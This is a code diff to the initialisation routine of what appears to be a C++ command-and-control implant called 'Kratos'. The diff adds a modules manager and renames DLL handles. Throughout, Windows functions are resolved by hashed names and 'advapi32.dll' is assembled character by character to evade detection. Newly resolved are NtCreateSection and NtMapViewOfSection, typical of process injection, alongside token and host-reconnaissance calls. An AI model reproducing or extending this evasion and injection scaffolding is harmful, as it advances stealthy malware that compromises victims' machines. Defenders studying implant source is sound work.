@@ -1,6 +1,7 @@
 #include "agent/core.h"
 #include "packager/packager.h"
 #include "net/net.h"
+#include "modules/modules.h"
 
 BOOL Kratos::Init() {
 
@@ -10,20 +11,22 @@ BOOL Kratos::Init() {
 		return FALSE;
 
 
-	packager = ( Packager * )pLocalAlloc( ALLOC_ARGS, sizeof( Packager ) );
-	net = (NetMgr*)pLocalAlloc(ALLOC_ARGS, sizeof(NetMgr));
-	if (!net || !packager) {
-		DEBUG_LOG("[!] Failed Allocating net and/or packager");
-		return FALSE;
-	}
-	DEBUG_LOG("[+] Allocated packager and net");
-
-	
-
 	if ( ! this->LoadApis( ) ) {
 		DEBUG_LOG("[!] Failed loading apis");
 		return FALSE;
 	}
+
+	packager = new Packager();
+	net      = new NetMgr();
+	modules  = new Modules();
+
+	if (!net || !packager || !modules) {
+		DEBUG_LOG("[!] Failed Allocating net and/or packager/modules");
+		return FALSE;
+	}
+	DEBUG_LOG("[+] Allocated packager,net modules");
+
+
 	if ( ! this->LoadConfig( ) ) {
 		DEBUG_LOG("[!] Failed loading config");
 		return FALSE;
@@ -36,6 +39,9 @@ BOOL Kratos::Init() {
 		DEBUG_LOG("[!] Failed register");
 		return FALSE;
 	}
+	//Sleep(20000);
+
+	
 	DEBUG_LOG("[*] Apis, Config, net init ran!");
 
 	return TRUE;
@@ -43,21 +49,23 @@ BOOL Kratos::Init() {
 
 BOOL Kratos::LoadApis( ) {
 	DEBUG_LOG("[+] Loading APIS");
-	this->modules.kernel32 = api::GetModule ( HASH_STRW ( L"KERNEL32.DLL" ) );
-	this->modules.ntdll    = api::GetModule ( HASH_STRW ( L"NTDLL.DLL"    ) );
+	this->dlls.kernel32 = api::GetModule ( HASH_STRW ( L"KERNEL32.DLL" ) );
+	this->dlls.ntdll    = api::GetModule ( HASH_STRW ( L"NTDLL.DLL"    ) );
 
 
-	if ( this->modules.kernel32 ) {
-		this->apis.LoadLibraryA   = ( decltype ( this->apis.LoadLibraryA   ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "LoadLibraryA"   ) );
-		this->apis.GetProcAddress = ( decltype ( this->apis.GetProcAddress ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "GetProcAddress" ) );
-		this->apis.CloseHandle    = ( decltype ( this->apis.CloseHandle    ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "CloseHandle"    ) );
+	if ( this->dlls.kernel32 ) {
+		this->apis.LoadLibraryA   = ( decltype ( this->apis.LoadLibraryA   ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LoadLibraryA"   ) );
+		this->apis.GetProcAddress = ( decltype ( this->apis.GetProcAddress ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetProcAddress" ) );
+		this->apis.CloseHandle    = ( decltype ( this->apis.CloseHandle    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "CloseHandle"    ) );
 
-		this->apis.LocalAlloc            = ( decltype ( this->apis.LocalAlloc   ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "LocalAlloc"   ) );
-		this->apis.LocalFree             = ( decltype ( this->apis.LocalFree    ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "LocalFree"    ) );
-		this->apis.LocalReAlloc          = ( decltype ( this->apis.LocalReAlloc ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "LocalReAlloc" ) );
-		this->apis.GetTickCount          = ( decltype ( this->apis.GetTickCount ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "GetTickCount" ) );
-		this->apis.GetUserDefaultGeoName = ( decltype ( this->apis.GetUserDefaultGeoName) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "GetUserDefaultGeoName" ) );
-		this->apis.GetComputerNameExW = ( decltype ( this->apis.GetComputerNameExW ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "GetComputerNameExW" ) );
+		this->apis.LocalAlloc            = ( decltype ( this->apis.LocalAlloc   ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalAlloc"   ) );
+		this->apis.LocalFree             = ( decltype ( this->apis.LocalFree    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalFree"    ) );
+		this->apis.LocalReAlloc          = ( decltype ( this->apis.LocalReAlloc ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalReAlloc" ) );
+		this->apis.GetTickCount          = ( decltype ( this->apis.GetTickCount ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetTickCount" ) );
+		this->apis.CreateFileA           = ( decltype ( this->apis.CreateFileA  ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "CreateFileA"  ) );
+
+		this->apis.GetUserDefaultGeoName = ( decltype ( this->apis.GetUserDefaultGeoName ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetUserDefaultGeoName" ) );
+		this->apis.GetComputerNameExW    = ( decltype ( this->apis.GetComputerNameExW    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetComputerNameExW"    ) );
 
 	}
 	else { return FALSE; }
@@ -65,11 +73,13 @@ BOOL Kratos::LoadApis( ) {
 
 
 
-	if (this->modules.ntdll) {
-		this->apis.RtlRandomEx               = ( decltype ( this->apis.RtlRandomEx               ) )api::GetProcAddress( this->modules.ntdll, HASH_STRA( "RtlRandomEx"               ) );
-		this->apis.NtOpenProcessToken        = ( decltype ( this->apis.NtOpenProcessToken        ) )api::GetProcAddress( this->modules.ntdll, HASH_STRA( "NtOpenProcessToken"        ) );
-		this->apis.NtQueryInformationToken   = ( decltype ( this->apis.NtQueryInformationToken   ) )api::GetProcAddress( this->modules.ntdll, HASH_STRA( "NtQueryInformationToken"   ) );
-		this->apis.NtQueryInformationProcess = ( decltype ( this->apis.NtQueryInformationProcess ) )api::GetProcAddress( this->modules.ntdll, HASH_STRA( "NtQueryInformationProcess" ) );
+	if (this->dlls.ntdll) {
+		this->apis.RtlRandomEx               = ( decltype ( this->apis.RtlRandomEx               ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "RtlRandomEx"               ) );
+		this->apis.NtOpenProcessToken        = ( decltype ( this->apis.NtOpenProcessToken        ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtOpenProcessToken"        ) );
+		this->apis.NtQueryInformationToken   = ( decltype ( this->apis.NtQueryInformationToken   ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtQueryInformationToken"   ) );
+		this->apis.NtQueryInformationProcess = ( decltype ( this->apis.NtQueryInformationProcess ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtQueryInformationProcess" ) );
+		this->apis.NtCreateSection           = ( decltype ( this->apis.NtCreateSection           ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtCreateSection"           ) );
+		this->apis.NtMapViewOfSection        = ( decltype ( this->apis.NtMapViewOfSection        ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtMapViewOfSection"        ) );
 	}
 	else { return FALSE; }
 
@@ -88,10 +98,10 @@ BOOL Kratos::LoadApis( ) {
 	buf[ 10 ] = 'l';
 	buf[ 11 ] = 'l';
 	buf[ 12 ] = '\0';
-	this->modules.Advapi32 = this->apis.LoadLibraryA( buf );
+	this->dlls.Advapi32 = this->apis.LoadLibraryA( buf );
 
-	if ( this->modules.Advapi32 ) {
-		this->apis.GetUserNameW = ( decltype( this->apis.GetUserNameW ) ) api::GetProcAddress( this->modules.Advapi32, HASH_STRA ( "GetUserNameW" ) );
+	if ( this->dlls.Advapi32 ) {
+		this->apis.GetUserNameW = ( decltype( this->apis.GetUserNameW ) ) api::GetProcAddress( this->dlls.Advapi32, HASH_STRA ( "GetUserNameW" ) );
 	}
 	else { return FALSE; }
 	DEBUG_LOG("[+] Loaded advapi32");
